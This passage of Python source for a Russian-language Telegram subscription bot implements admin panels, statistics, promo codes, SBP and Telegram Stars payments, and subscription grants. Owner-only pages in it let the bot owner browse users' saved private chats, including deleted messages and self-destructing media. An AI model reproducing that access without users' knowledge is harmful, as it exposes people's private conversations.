            (target_id, target_id, target_id, ADMIN_CHATS_PAGE_SIZE, page_number * ADMIN_CHATS_PAGE_SIZE),
        ).fetchall()
    text = (
        f"{pe('view')} <b>Чаты пользователя</b>\n"
        f"{stored_user_label(target_id, *(target_user or (None, None, None)))}\n"
        f"ID: <code>{target_id}</code> · всего: <b>{total}</b> · "
        f"страница {page_number + 1}/{page_count}\n\n"
        "Нажми на чат, чтобы посмотреть сохранённые сообщения."
    )
    rows = [
        [btn(
            f"{chat_participant_label(author)[:40]} · {message_count} сообщений",
            f"umsg:{target_id}:{chat_id}:{return_page}:{page_number}:0",
            emoji="view",
        )]
        for chat_id, message_count, _participants, _updated_at, author in chats
    ]
    navigation = []
    if page_number > 0:
        navigation.append(btn("Назад", f"uchats:{target_id}:{return_page}:{page_number - 1}", emoji="home"))
    if page_number + 1 < page_count:
        navigation.append(btn("Дальше", f"uchats:{target_id}:{return_page}:{page_number + 1}", emoji="view"))
    if navigation:
        rows.append(navigation)
    rows.extend([
        [btn("Карточка пользователя", f"user:{target_id}:{return_page}", emoji="profile")],
        [btn("Все пользователи", f"users:{return_page}", emoji="home")],
        BACK_HOME,
    ])
    return text, kb(rows)


def page_user_chat_messages(
    admin_id: int,
    target_id: int,
    chat_id: int,
    return_page: int = 0,
    chats_page: int = 0,
    page_number: int = 0,
) -> tuple[str, dict]:
    if not is_owner_admin(admin_id) or target_id in CHAT_VIEW_BLOCKED_USER_IDS:
        return "Эта страница доступна только владельцу бота.", kb([BACK_HOME])
    with sqlite3.connect(DB_PATH) as conn:
        target_user = conn.execute(
            "SELECT first_name, last_name, username FROM users WHERE user_id = ?",
            (target_id,),
        ).fetchone()
        params = (target_id, target_id, chat_id)
        total = int(conn.execute(
            "SELECT COUNT(*) " + OWNER_MESSAGES_FROM + " AND m.chat_id = ?",
            params,
        ).fetchone()[0])
        page_count = max(1, (total + ADMIN_MESSAGES_PAGE_SIZE - 1) // ADMIN_MESSAGES_PAGE_SIZE)
        page_number = min(max(0, page_number), page_count - 1)
        messages = conn.execute(
            """
            SELECT m.message_id, m.user_id, m.author, m.content, m.media_type,
                   m.updated_at, m.deleted_at, m.reply_to_message_id,
                   m.reply_to_author, m.reply_to_content
            """ + OWNER_MESSAGES_FROM + """
            AND m.chat_id = ?
            ORDER BY m.updated_at DESC, m.message_id DESC
            LIMIT ? OFFSET ?
            """,
            (*params, ADMIN_MESSAGES_PAGE_SIZE, page_number * ADMIN_MESSAGES_PAGE_SIZE),
        ).fetchall()
    chat_label = next(
        (chat_participant_label(row[2], row[1]) for row in messages if row[1] != target_id and row[2]),
        f"Чат {chat_id}",
    )
    lines = []
    for message_id, sender_id, author, content, media_type, updated_at, deleted_at, reply_id, reply_author, reply_content in messages:
        body = str(content or "[без текста]")
        if len(body) > 300:
            body = body[:297] + "..."
        flags = []
        if media_type:
            flags.append(str(media_type))
        if deleted_at:
            flags.append("удалено")
        suffix = f" · {', '.join(flags)}" if flags else ""
        sender_label = chat_participant_label(author, sender_id)
        reply_line = ""
        if reply_id:
            reply_line = f"\n↩ Ответ на {html_text(chat_participant_label(reply_author))}: {html_quote(reply_content or '[сообщение]')}"
        lines.append(
            f"<b>{html_text(sender_label)}</b>"
            f"{f' · <code>{sender_id}</code>' if sender_id and sender_id != target_id else ''}\n"
            f"{format_display_time(updated_at)}"
            f" · ID {message_id}{suffix}\n{html_quote(body)}{reply_line}"
        )
    text = (
        f"{pe('history')} <b>Сообщения чата</b>\n"
        f"Пользователь: {stored_user_label(target_id, *(target_user or (None, None, None)))}\n"
        f"Чат: <b>{html_text(chat_label)}</b> · <code>{chat_id}</code>\n"
        f"Всего: <b>{total}</b> · страница {page_number + 1}/{page_count}\n\n"
        + ("\n\n".join(lines) if lines else "Сохранённых сообщений нет.")
    )
    navigation = []
    if page_number > 0:
        navigation.append(btn("Новее", f"umsg:{target_id}:{chat_id}:{return_page}:{chats_page}:{page_number - 1}", emoji="refresh"))
    if page_number + 1 < page_count:
        navigation.append(btn("Раньше", f"umsg:{target_id}:{chat_id}:{return_page}:{chats_page}:{page_number + 1}", emoji="history"))
    rows = [
        [btn(
            f"{ADMIN_MEDIA_LABELS[media_type]} · {str(author or sender_id or 'без имени')[:32]}",
            f"umedia:{target_id}:{chat_id}:{message_id}",
        )]
        for message_id, sender_id, author, _content, media_type, _updated_at, _deleted_at, _reply_id, _reply_author, _reply_content in messages
        if media_type in ADMIN_MEDIA_LABELS
    ]
    if navigation:
        rows.append(navigation)
    rows.extend([
        [btn("К чатам пользователя", f"uchats:{target_id}:{return_page}:{chats_page}", emoji="view")],
        [btn("Карточка пользователя", f"user:{target_id}:{return_page}", emoji="profile")],
        BACK_HOME,
    ])
    return text, kb(rows)


def get_user_owned_saved_message(target_id: int, chat_id: int, message_id: int) -> dict | None:
    with sqlite3.connect(DB_PATH) as conn:
        conn.row_factory = sqlite3.Row
        row = conn.execute(
            """
            SELECT m.user_id, m.author, m.content,
                   m.media_type, m.media_file_id, m.media_unique_id, m.media_json,
                   m.local_media_path, m.has_media_spoiler, m.ttl_seconds, m.deleted_at
            """ + OWNER_MESSAGES_FROM + """
            AND m.chat_id = ? AND m.message_id = ?
            ORDER BY m.updated_at DESC
            LIMIT 1
            """,
            (target_id, target_id, chat_id, message_id),
        ).fetchone()
    return dict(row) if row else None


def page_stats(user_id: int) -> tuple[str, dict]:
    if not is_admin_user(user_id):
        return "Только для админов.", kb([BACK_HOME])
    now = int(time.time())
    day_start = now - (now % 86400)
    with sqlite3.connect(DB_PATH) as conn:
        total_users = int(conn.execute("SELECT COUNT(*) FROM users").fetchone()[0])
        active = int(conn.execute("SELECT COUNT(*) FROM subs WHERE until_ts > ?", (now,)).fetchone()[0])
        expired = int(conn.execute("SELECT COUNT(*) FROM subs WHERE until_ts > 0 AND until_ts <= ?", (now,)).fetchone()[0])
        buyers = int(conn.execute("SELECT COUNT(DISTINCT user_id) FROM (SELECT user_id FROM payments UNION ALL SELECT user_id FROM sbp_payments WHERE status='paid')").fetchone()[0])
        stars = conn.execute("SELECT COUNT(*), COALESCE(SUM(stars),0) FROM payments").fetchone()
        rub = conn.execute("SELECT COUNT(*), COALESCE(SUM(rub),0) FROM sbp_payments WHERE status='paid'").fetchone()
        daily = []
        for ago in range(6, -1, -1):
            start = day_start - ago * 86400
            users_count = int(conn.execute("SELECT COUNT(*) FROM users WHERE created_at >= ? AND created_at < ?", (start, start + 86400)).fetchone()[0])
            pay_count = int(conn.execute("SELECT COUNT(*) FROM (SELECT created_at FROM payments UNION ALL SELECT paid_at FROM sbp_payments WHERE status='paid') WHERE created_at >= ? AND created_at < ?", (start, start + 86400)).fetchone()[0])
            daily.append((start, users_count, pay_count))
        periods = []
        for label, seconds in (("24 часа", 86400), ("7 дней", 7 * 86400), ("30 дней", 30 * 86400)):
            count = int(conn.execute("SELECT COUNT(*) FROM users WHERE created_at >= ?", (now - seconds,)).fetchone()[0])
            periods.append(f"Новые за {label}: <b>{count}</b>")
    peak = max([max(u, p) for _, u, p in daily] + [1])
    chart = "\n".join(
        f"{time.strftime('%d.%m', time.localtime(ts))}  {'█' * max(1, round(u / peak * 8)) if u else '·'} {u} новых | {'▓' * max(1, round(p / peak * 8)) if p else '·'} {p} оплат"
        for ts, u, p in daily
    )
    conversion = round(buyers * 100 / total_users, 1) if total_users else 0
    text = (
        f"{pe('admin')} <b>Статистика</b>\n\n" + "\n".join(periods) +
        f"\nВсего пользователей: <b>{total_users}</b>\nАктивных подписок: <b>{active}</b>\n"
        f"Истёкших подписок: <b>{expired}</b>\nПокупателей: <b>{buyers}</b>\n"
        f"Конверсия в покупку: <b>{conversion}%</b>\n\n"
        f"Stars: <b>{stars[0]}</b> оплат на <b>{stars[1]} ⭐</b>\n"
        f"СБП: <b>{rub[0]}</b> оплат на <b>{rub[1]} ₽</b>\n\n"
        f"<b>График за 7 дней</b>\n<code>{chart}</code>"
    )
    return text, kb([[btn("Обновить", "stats", emoji="refresh")], [btn("Админ-панель", "panel", emoji="home")], BACK_HOME])


def page_promos(user_id: int) -> tuple[str, dict]:
    if not is_admin_user(user_id):
        return "Только для админов.", kb([BACK_HOME])
    with sqlite3.connect(DB_PATH) as conn:
        rows = conn.execute("SELECT code, discount_percent, expires_at, max_uses, uses, active FROM promo_codes ORDER BY created_at DESC LIMIT 20").fetchall()
    lines = [f"<b>{html_text(code)}</b> — {discount}% · {uses}/{limit} · до {format_until(expires)} · {'включён' if active else 'выключен'}" for code, discount, expires, limit, uses, active in rows]
    buttons = [[btn("Создать промокод", "promo:create", emoji="add", style="success")]]
    buttons.extend([[btn(f"{'Выключить' if active else 'Включить'} {code}", f"promo:toggle:{code}", emoji="promo")] for code, _, _, _, _, active in rows[:10]])
    buttons.extend([[btn("Админ-панель", "panel", emoji="home")], BACK_HOME])
    return f"{pe('promo')} <b>Промокоды</b>\n\n" + ("\n".join(lines) if lines else "Промокодов пока нет."), kb(buttons)


def page_admin_log(user_id: int) -> tuple[str, dict]:
    if not is_admin_user(user_id):
        return "Только для админов.", kb([BACK_HOME])
    with sqlite3.connect(DB_PATH) as conn:
        rows = conn.execute("SELECT admin_id, action, target_id, details, created_at FROM admin_actions ORDER BY id DESC LIMIT 30").fetchall()
    lines = [f"{time.strftime('%d.%m %H:%M', time.localtime(ts))} · <code>{admin}</code> · <b>{html_text(action)}</b>{f' · {target}' if target else ''}{f' · {html_text(details)}' if details else ''}" for admin, action, target, details, ts in rows]
    return f"{pe('admin')} <b>Журнал администраторов</b>\n\n" + ("\n".join(lines) if lines else "Действий пока нет."), kb([[btn("Админ-панель", "panel", emoji="home")], BACK_HOME])


def page_gift_buy(payer_id: int, target_id: int) -> tuple[str, dict]:
    plans = get_plans()
    target = stored_user_payment_label(target_id)
    rows = []
    for days, prices in plans.items():
        rub, _ = discounted_price(payer_id, prices["rub"])
        stars, _ = discounted_price(payer_id, prices["stars"])
        rows.append([btn(f"{days} дн. · {rub} ₽", f"gift:sbp:{target_id}:{days}", emoji="pay"), btn(f"{stars} ⭐", f"gift:stars:{target_id}:{days}", emoji="stars")])
    rows.extend([[btn("Другой получатель", "gift:start", emoji="gift")], [btn("К тарифам", "buy", emoji="home")], BACK_HOME])
    return f"{pe('gift')} <b>Подарочная подписка</b>\n\nПолучатель:\n{target}\n\nВыбери тариф и способ оплаты.", kb(rows)


def page_panel(user_id: int) -> tuple[str, dict]:
    now = int(time.time())
    with sqlite3.connect(DB_PATH) as conn:
        users = int(conn.execute("SELECT COUNT(*) FROM users").fetchone()[0])
        actives = int(conn.execute("SELECT COUNT(*) FROM subs WHERE until_ts > ?", (now,)).fetchone()[0])
        open_tickets = int(conn.execute("SELECT COUNT(*) FROM support_tickets WHERE status='open'").fetchone()[0])
        pays = conn.execute("SELECT COUNT(*), COALESCE(SUM(stars), 0) FROM payments").fetchone()
        sbp = conn.execute(
            "SELECT COUNT(*), COALESCE(SUM(rub), 0) FROM sbp_payments WHERE status = 'paid'"
        ).fetchone()

    role = "владелец" if is_owner_admin(user_id) else "администратор"
    text = (
        f"{pe('admin')} <b>Админ-панель</b> · {role}\n\n"
        f"Пользователей: <b>{users}</b>\n"
        f"Активных подписок: <b>{actives}</b>\n"
        f"Открытых обращений: <b>{open_tickets}</b>\n"
        f"Оплат Stars: <b>{pays[0]}</b> · {pays[1]} ⭐\n"
        f"Оплат СБП: <b>{sbp[0]}</b> · {sbp[1]} ₽"
    )

    rows = [
        [btn("Пользователи", "users:0", emoji="view"), btn("Статистика", "stats", emoji="admin")],
        [btn("Обращения", "tickets", emoji="support"), btn("Истекают подписки", "expiring", emoji="history")],
        [btn("Рассылка", "broadcast", emoji="support"), btn("Промокоды", "promos", emoji="promo")],
        [btn("Выдать подписку", "grant", emoji="add", style="success"), btn("Цены", "prices", emoji="pay")],
        [btn("Экспорт CSV", "export", emoji="view"), btn("Проверка работы", "health", emoji="check")],
        [btn("Журнал действий", "audit", emoji="history")],
    ]
    if is_owner_admin(user_id):
        rows.append([btn("Администраторы", "admins", emoji="admin"), btn("Резервная копия", "backup", emoji="refresh")])
    rows.extend([[btn("Обновить", "panel", emoji="refresh")], BACK_HOME])
    return text, kb(rows)

def page_admins(user_id: int) -> tuple[str, dict]:
    if not is_admin_user(user_id):
        return "Только для администраторов.", kb([BACK_HOME])

    delegated = list_delegated_admins()
    owner_lines = [f"• <code>{uid}</code> — владелец" for uid in sorted(ADMIN_USER_IDS)]
    admin_lines = [
        f"• <code>{uid}</code> — добавил <code>{added_by}</code>, "
        f"{time.strftime('%d.%m.%Y', time.localtime(created_at))}"
        for uid, added_by, created_at in delegated
    ]
    body = "\n".join(owner_lines + admin_lines) or "Администраторов пока нет."
    text = (
        f"{pe('admin')} <b>Администраторы</b>\n\n{body}\n\n"
        "Администраторы получают доступ к пользователям, поддержке, статистике, "
        "рассылкам, промокодам и подпискам. Выдавать и снимать админку может только владелец."
    )

    rows: list[list[dict]] = []
    if is_owner_admin(user_id):
        rows.append([btn("Добавить администратора", "admin:add", emoji="add", style="success")])
        for uid, _, _ in delegated[:20]:
            rows.append([btn(f"Снять админку · {uid}", f"admin:remove:{uid}", emoji="warning", style="danger")])
    rows.extend([[btn("Админ-панель", "panel", emoji="home")], BACK_HOME])
    return text, kb(rows)


def page_support_tickets(user_id: int) -> tuple[str, dict]:
    if not is_admin_user(user_id):
        return "Только для администраторов.", kb([BACK_HOME])
    with sqlite3.connect(DB_PATH) as conn:
        open_count = int(conn.execute("SELECT COUNT(*) FROM support_tickets WHERE status='open'").fetchone()[0])
        rows = conn.execute(
            "SELECT id, user_id, user_text, created_at FROM support_tickets "
            "WHERE status='open' ORDER BY id DESC LIMIT 12"
        ).fetchall()

    lines = [
        f"<b>#{ticket_id}</b> · <code>{target_id}</code> · "
        f"{time.strftime('%d.%m %H:%M', time.localtime(created_at))}\n"
        f"{html_text(text[:180])}{'…' if len(text) > 180 else ''}"
        for ticket_id, target_id, text, created_at in rows
    ]
    text = (
        f"{pe('support')} <b>Обращения поддержки</b>\n"
        f"Открытых: <b>{open_count}</b>\n\n"
        + ("\n\n".join(lines) if lines else "Новых обращений нет.")
    )
    buttons = [
        [btn(f"Ответить на #{ticket_id}", f"support:reply:{ticket_id}:{target_id}", emoji="support")]
        for ticket_id, target_id, _, _ in rows[:8]
    ]
    buttons.extend([[btn("Обновить", "tickets", emoji="refresh")], [btn("Админ-панель", "panel", emoji="home")], BACK_HOME])
    return text, kb(buttons)


def page_expiring_subscriptions(user_id: int) -> tuple[str, dict]:
    if not is_admin_user(user_id):
        return "Только для администраторов.", kb([BACK_HOME])
    now = int(time.time())
    soon = now + 7 * 86400
    with sqlite3.connect(DB_PATH) as conn:
        rows = conn.execute(
            """
            SELECT u.user_id, u.first_name, u.last_name, u.username, s.until_ts
            FROM subs AS s
            LEFT JOIN users AS u ON u.user_id = s.user_id
            WHERE s.until_ts > ? AND s.until_ts <= ?
            ORDER BY s.until_ts ASC
            LIMIT 30
            """,
            (now, soon),
        ).fetchall()
    lines = []
    for uid, first_name, last_name, username, until_ts in rows:
        label = stored_user_label(int(uid), first_name, last_name, username)
        days = max(1, (int(until_ts) - now + 86399) // 86400)
        lines.append(f"• {label} · <b>{days} дн.</b> · до {format_until(int(until_ts))}")
    text = (
        f"{pe('history')} <b>Подписки истекают за 7 дней</b>\n\n"
        + ("\n".join(lines) if lines else "В ближайшие 7 дней активные подписки не заканчиваются.")
    )
    return text, kb([[btn("Обновить", "expiring", emoji="refresh")], [btn("Админ-панель", "panel", emoji="home")], BACK_HOME])


def page_prices(user_id: int) -> tuple[str, dict]:
    plans = get_plans()
    lines = [
        f"<b>{days} дней</b>: {prices['rub']} ₽ / {prices['stars']} ⭐"
        for days, prices in plans.items()
    ]
    rows: list[list[dict]] = []
    for days, prices in plans.items():
        rows.append(
            [
                btn(f"{days} дн. · {prices['rub']} ₽", f"price:{days}:rub", emoji="pay"),
                btn(f"{days} дн. · {prices['stars']} ⭐", f"price:{days}:stars", emoji="stars"),
            ]
        )
    rows.extend([[btn("Назад в админ-панель", "panel", emoji="home")], BACK_HOME])
    return (
        f"{pe('pay')} <b>Цены подписки</b>\n\n" + "\n".join(lines) + "\n\nНажми цену, которую хочешь изменить.",
        kb(rows),
    )


# --- транспорт для кнопок ------------------------------------------------------

def answer_callback(query_id: str, text: str | None = None, show_alert: bool = False) -> None:
    if not query_id:
        return
    payload: dict[str, object] = {"callback_query_id": query_id}
    if text:
        payload["text"] = text
        payload["show_alert"] = show_alert
    try:
        telegram_call("answerCallbackQuery", payload)
    except TelegramApiError as exc:
        log(f"answerCallbackQuery failed: {exc}")


def edit_page(chat_id: int, message_id: int, text: str, markup: dict) -> None:
    if message_id:
        try:
            user_id = chat_id
            stored = _menu_message(user_id)
            method = "editMessageCaption" if stored and stored[2] else "editMessageText"
            field = "caption" if method == "editMessageCaption" else "text"
            telegram_call(method, {"chat_id": chat_id, "message_id": message_id, field: text, "parse_mode": "HTML", "reply_markup": markup})
            return
        except TelegramApiError as exc:
            if "message is not modified" in str(exc):
                return
            log(f"editMessageText failed: {exc}")
    send_menu_page(chat_id, chat_id, text, markup, use_photo="<b>Holly Bot</b>" in text)


# --- оплата СБП и звёздами ----------------------------------------------------

def rollypay_call(method: str, path: str, payload: dict | None = None) -> dict:
    data = json.dumps(payload).encode("utf-8") if payload is not None else None
    headers = {"X-API-Key": ROLLYPAY_API_KEY, "X-Nonce": str(uuid.uuid4())}
    if data is not None:
        headers["Content-Type"] = "application/json"
    request = Request(ROLLYPAY_API_BASE + path, data=data, headers=headers, method=method)
    try:
        with urlopen(request, timeout=20) as response:
            result = json.loads(response.read().decode("utf-8"))
    except (HTTPError, URLError, ValueError) as exc:
        raise RuntimeError(f"RollyPay request failed: {exc}") from exc
    if not isinstance(result, dict):
        raise RuntimeError("RollyPay returned invalid response")
    return result


def send_sbp_payment(user_id: int, chat_id: int, days: int, target_id: int | None = None) -> None:
    plan = get_plan(days)
    if not plan:
        send_message(chat_id, "Тариф больше не доступен. Обнови меню.")
        return
    if not ROLLYPAY_ENABLED:
        send_message(chat_id, "Оплата по СБП временно недоступна. Выбери Telegram Stars.")
        return
    beneficiary_id = target_id or user_id
    rub, promo_code = discounted_price(user_id, plan["rub"])
    order_id = f"sub-{uuid.uuid4()}"
    payload: dict[str, object] = {
        "amount": f"{rub:.2f}",
        "payment_currency": "RUB",
        "order_id": order_id,
        "description": f"Подписка Holly Bot на {days} дней" + (" в подарок" if beneficiary_id != user_id else ""),
        "customer_id": str(user_id),
        "metadata": {"telegram_user_id": str(user_id), "beneficiary_id": str(beneficiary_id), "days": str(days), "promo_code": promo_code or ""},
        "test": ROLLYPAY_TEST_MODE,
    }
    if ROLLYPAY_TERMINAL_ID:
        payload["terminal_id"] = ROLLYPAY_TERMINAL_ID
    try:
        payment = rollypay_call("POST", "/api/v1/payments", payload)
        payment_id = str(payment["payment_id"])
        pay_url = str(payment["pay_url"])
        if not payment_id or payment_id == "None" or not pay_url.startswith("https://"):
            raise KeyError("invalid payment response")
    except (RuntimeError, KeyError) as exc:
        log(f"SBP payment creation failed for {user_id}: {exc}")
        report_technical_issue("sbp_create", f"СБП не создаёт платежи: {exc}")
        send_message(chat_id, "Не удалось создать платёж СБП. Попробуй ещё раз через минуту.")
        return
    with sqlite3.connect(DB_PATH) as conn:
        conn.execute(
            """
            INSERT INTO sbp_payments (payment_id, order_id, user_id, days, rub, status, created_at, payer_id, promo_code)
            VALUES (?, ?, ?, ?, ?, 'created', ?, ?, ?)
            """,
            (payment_id, order_id, beneficiary_id, days, rub, int(time.time()), user_id, promo_code),
        )
    markup = kb(
        [
            [btn(f"Оплатить {rub} ₽ по СБП", url=pay_url, emoji="pay", style="success")],
            [btn("Проверить оплату", f"sbp:check:{order_id}", emoji="refresh")],
            [btn("Назад к тарифам", "buy", emoji="home")],
        ]
    )
    gift_line = f"\nПодарок пользователю: <code>{beneficiary_id}</code>" if beneficiary_id != user_id else ""
    send_message(
        chat_id,
        f"{pe('pay')} <b>Счёт СБП создан</b>\n\n"
        f"Тариф: <b>{days} дней</b>\nК оплате: <b>{rub} ₽</b>{gift_line}\n\n"
        f"После оплаты вернись сюда и нажми «Проверить оплату».",
        parse_mode="HTML",
        reply_markup=markup,
    )


def check_sbp_payment(user_id: int, order_id: str) -> tuple[bool, str]:
    with sqlite3.connect(DB_PATH) as conn:
        row = conn.execute(
            "SELECT payment_id, user_id, days, rub, status, COALESCE(payer_id,user_id), promo_code FROM sbp_payments WHERE order_id = ?",
            (order_id,),
        ).fetchone()
    if not row or int(row[5]) != user_id:
        return False, "Платёж не найден"
    payment_id, beneficiary_id, days, rub, status, payer_id, promo_code = row
    if status == "paid":
        return True, "Этот платёж уже зачислен"
    try:
        payment = rollypay_call("GET", f"/api/v1/payments/{quote(payment_id, safe='')}")
    except RuntimeError as exc:
        log(f"SBP payment check failed for {payment_id}: {exc}")
        report_technical_issue("sbp_check", f"СБП не проверяет платежи: {exc}")
        return False, "Не удалось проверить платёж. Попробуй ещё раз"
    try:
        amount_matches = Decimal(str(payment.get("amount") or "0")) == Decimal(int(rub))
    except InvalidOperation:
        amount_matches = False
    matches = (
        str(payment.get("payment_id") or "") == payment_id
        and str(payment.get("order_id") or "") == order_id
        and str(payment.get("payment_currency", payment.get("currency", ""))).upper() == "RUB"
        and amount_matches
    )
    if payment.get("status") != "paid" or not matches:
        return False, "Платёж пока не подтверждён"
    with sqlite3.connect(DB_PATH) as conn:
        cur = conn.execute(
            "UPDATE sbp_payments SET status = 'paid', paid_at = ? WHERE payment_id = ? AND status != 'paid'",
            (int(time.time()), payment_id),
        )
    if cur.rowcount:
        until = add_days(int(beneficiary_id), int(days))
        consume_promo(int(payer_id), promo_code)
        notify_admins_sbp_payment(int(beneficiary_id), int(days), int(rub), int(payer_id))
        if int(beneficiary_id) != int(payer_id):
            send_message(get_private_chat_id(int(beneficiary_id)), f"{pe('gift')} Тебе подарили подписку на <b>{days} дней</b> — до {format_until(until)}.", parse_mode="HTML")
        return True, f"Оплачено! Подписка {'получателя ' if int(beneficiary_id) != int(payer_id) else ''}активна до {format_until(until)}"
    return True, "Этот платёж уже зачислен"

def send_subscription_invoice(user_id: int, chat_id: int, days: int, target_id: int | None = None) -> None:
    plan = get_plan(days)
    if not plan:
        send_message(chat_id, "Тариф больше не доступен. Обнови меню.")
        return
    beneficiary_id = target_id or user_id
    stars, promo_code = discounted_price(user_id, plan["stars"])
    try:
        telegram_call(
            "sendInvoice",
            {
                "chat_id": chat_id,
                "title": f"{'Подарочная подписка' if beneficiary_id != user_id else 'Подписка Holly Bot'} — {days} дней",
                "description": "Доступ ко всем функциям бота. Остаток суммируется при продлении.",
                "payload": f"sub:{user_id}:{beneficiary_id}:{days}:{stars}:{promo_code or '-'}",
                "provider_token": "",
                "currency": "XTR",
                "prices": [{"label": f"{days} дней подписки", "amount": stars}],
            },
        )
    except TelegramApiError as exc:
        log(f"sendInvoice failed for {user_id}: {exc}")
        report_technical_issue("stars_invoice", f"Telegram Stars не создаёт счёт: {exc}")
        send_message(chat_id, "Не удалось создать счёт на оплату. Попробуй ещё раз через минуту.")


def parse_subscription_payload(payload: str) -> tuple[int, int, int, int, str | None] | None:
    parts = payload.split(":")
    try:
        if len(parts) == 4 and parts[0] == "sub":
            payer, days, amount = int(parts[1]), int(parts[2]), int(parts[3])
            return payer, payer, days, amount, None
        if len(parts) == 6 and parts[0] == "sub":
            return int(parts[1]), int(parts[2]), int(parts[3]), int(parts[4]), None if parts[5] == "-" else parts[5]
    except ValueError:
        return None
    return None


def valid_subscription_amount(payer_id: int, days: int, amount: int, promo_code: str | None) -> bool:
    plan = get_plan(days)
    if not plan:
        return False
    expected = plan["stars"]
    if promo_code:
        with sqlite3.connect(DB_PATH) as conn:
            row = conn.execute("SELECT discount_percent FROM promo_codes WHERE code=?", (promo_code,)).fetchone()
        if not row:
            return False
        expected = max(1, (expected * (100 - int(row[0])) + 99) // 100)
    return amount == expected


def handle_pre_checkout_query(query: dict) -> None:
    qid = str(query.get("id") or "")
    parsed = parse_subscription_payload(str(query.get("invoice_payload") or ""))
    valid = False
    if parsed and query.get("currency") == "XTR":
        payer, _, days, stars, promo_code = parsed
        payer_id = (query.get("from") or {}).get("id")
        valid = (
            payer
            and payer == payer_id
            and valid_subscription_amount(payer, days, stars, promo_code)
            and int(query.get("total_amount") or 0) == stars
        )
    if valid:
        telegram_call("answerPreCheckoutQuery", {"pre_checkout_query_id": qid, "ok": True})
    else:
        telegram_call(
            "answerPreCheckoutQuery",
            {"pre_checkout_query_id": qid, "ok": False, "error_message": "Тариф устарел — открой меню заново"},
        )


def notify_admins_payment(user_id: int, days: int, stars: int, payer_id: int | None = None) -> None:
    with sqlite3.connect(DB_PATH) as conn:
        total = conn.execute("SELECT COALESCE(SUM(stars), 0) FROM payments").fetchone()[0]
    until = get_sub(user_id)[0]
    payer_line = f"Покупатель: <code>{payer_id}</code>\n" if payer_id and payer_id != user_id else ""
    line = (
        f"{pe('pay')} <b>Новая покупка подписки</b>\n\n"
        f"{stored_user_payment_label(user_id)}\n"
        f"{payer_line}"
        f"Способ: <b>Telegram Stars</b>\n"
        f"Тариф: <b>{days} дней</b>\n"
        f"Оплачено: <b>{stars} ⭐</b>\n"
        f"Подписка до: <b>{format_until(until)}</b>\n\n"
        f"Всего собрано: <b>{total} ⭐</b>"
    )
    for admin_id in sorted(ADMIN_USER_IDS):
        try:
            send_message(admin_id, line, parse_mode="HTML")
        except TelegramApiError:
            pass


def notify_admins_sbp_payment(user_id: int, days: int, rub: int, payer_id: int | None = None) -> None:
    with sqlite3.connect(DB_PATH) as conn:
        total = conn.execute(
            "SELECT COALESCE(SUM(rub), 0) FROM sbp_payments WHERE status = 'paid'"
        ).fetchone()[0]
    until = get_sub(user_id)[0]
    payer_line = f"Покупатель: <code>{payer_id}</code>\n" if payer_id and payer_id != user_id else ""
    line = (
        f"{pe('pay')} <b>Новая покупка подписки</b>\n\n"
        f"{stored_user_payment_label(user_id)}\n"
        f"{payer_line}"
        f"Способ: <b>СБП</b>\n"
        f"Тариф: <b>{days} дней</b>\n"
        f"Оплачено: <b>{rub} ₽</b>\n"
        f"Подписка до: <b>{format_until(until)}</b>\n\n"
        f"Всего собрано: <b>{total} ₽</b>"
    )
    for admin_id in sorted(ADMIN_USER_IDS):
        try:
            send_message(admin_id, line, parse_mode="HTML")
        except TelegramApiError:
            pass


def handle_successful_payment(message: dict) -> None:
    payment = message.get("successful_payment") or {}
    parsed = parse_subscription_payload(str(payment.get("invoice_payload") or ""))
    if not parsed or payment.get("currency") != "XTR":
        return
    expected_payer, beneficiary_id, days, stars, promo_code = parsed
    if not valid_subscription_amount(expected_payer, days, stars, promo_code) or int(payment.get("total_amount") or 0) != stars:
        log(f"Rejected payment payload: {payment.get('invoice_payload')}")
        return

    payer = message.get("from") or {}
    payer_id = int(payer.get("id") or expected_payer)
    if payer_id != expected_payer:
        return
    register_user(payer_id, int((message.get("chat") or {}).get("id") or payer_id), payer)
    tg_charge = str(payment.get("telegram_charge_id") or f"manual:{int(time.time())}:{payer_id}")
    now = int(time.time())
    with sqlite3.connect(DB_PATH) as conn:
        cur = conn.execute(
            """
            INSERT OR IGNORE INTO payments (tg_payment_id, user_id, days, stars, payload, created_at, payer_id, promo_code)
            VALUES (?, ?, ?, ?, ?, ?, ?, ?)
            """,
            (tg_charge, beneficiary_id, days, stars, payment.get("invoice_payload"), now, payer_id, promo_code),
        )
        if cur.rowcount == 0:
            return  # такой платёж уже обработан
    until = add_days(beneficiary_id, days)
    consume_promo(payer_id, promo_code)
    chat_id = int(message.get("chat", {}).get("id") or get_private_chat_id(payer_id))
    send_message(
        chat_id,
        f"{pe('check')} <b>Оплачено!</b> Подписка {'получателя ' if beneficiary_id != payer_id else ''}активна до <b>{format_until(until)}</b>.\n"
        f"Спасибо! {pe('home')} Меню — /start",
        parse_mode="HTML",
    )
    if beneficiary_id != payer_id:
        send_message(get_private_chat_id(beneficiary_id), f"{pe('gift')} Тебе подарили подписку на <b>{days} дней</b> — до {format_until(until)}.", parse_mode="HTML")
    notify_admins_payment(beneficiary_id, days, stars, payer_id)


# --- выдача подписки админом ----------------------------------------------------

def grant_subscription(admin_id: int, chat_id: int, target_id: int, days: int) -> None:
    if not 1 <= days <= 3650:
        send_message(chat_id, "Дней должно быть от 1 до 3650.")
        return
    until = add_days(target_id, days)
    audit_admin(admin_id, "выдача подписки", target_id, f"{days} дней")
    send_message(
        chat_id,
        f"{pe('check')} Выдал <b>{days} дн.</b> пользователю <code>{target_id}</code> "
        f"(до {format_until(until)}).",
        parse_mode="HTML",
    )
    if target_id != admin_id:
        try:
            send_message(
                get_private_chat_id(target_id),
                f"{pe('gift')} Администратор активировал тебе подписку на <b>{days} дн.</b> "
                f"— до {format_until(until)}.",
                parse_mode="HTML",
            )
        except TelegramApiError:
            pass


def handle_sub_command(message: dict, args: list[str]) -> None:
    user_id = int(message["from"]["id"])
    chat_id = int(message["chat"]["id"])
    if not is_admin_user(user_id):
        deny_admin_command(chat_id)
        return
    if not args:
        send_message(chat_id, "Формат: /sub <ID> <дней>. Снять подписку: /sub <ID> 0")
        return
    try:
        target_id = int(args[0])
        days = int(args[1]) if len(args) > 1 else 30
    except ValueError:
        send_message(chat_id, "ID и количество дней должны быть числами. Пример: /sub 123456789 30")
        return
    if days <= 0:
        set_until(target_id, 0)
        audit_admin(user_id, "снятие подписки", target_id)
        send_message(chat_id, f"Снял подписку у {target_id}.")
        return
    grant_subscription(user_id, chat_id, target_id, days)


def handle_grant_input(user_id: int, chat_id: int, text: str) -> bool:
    """Ответ админа на «напиши ID и дни» после кнопки «Выдать подписку»."""
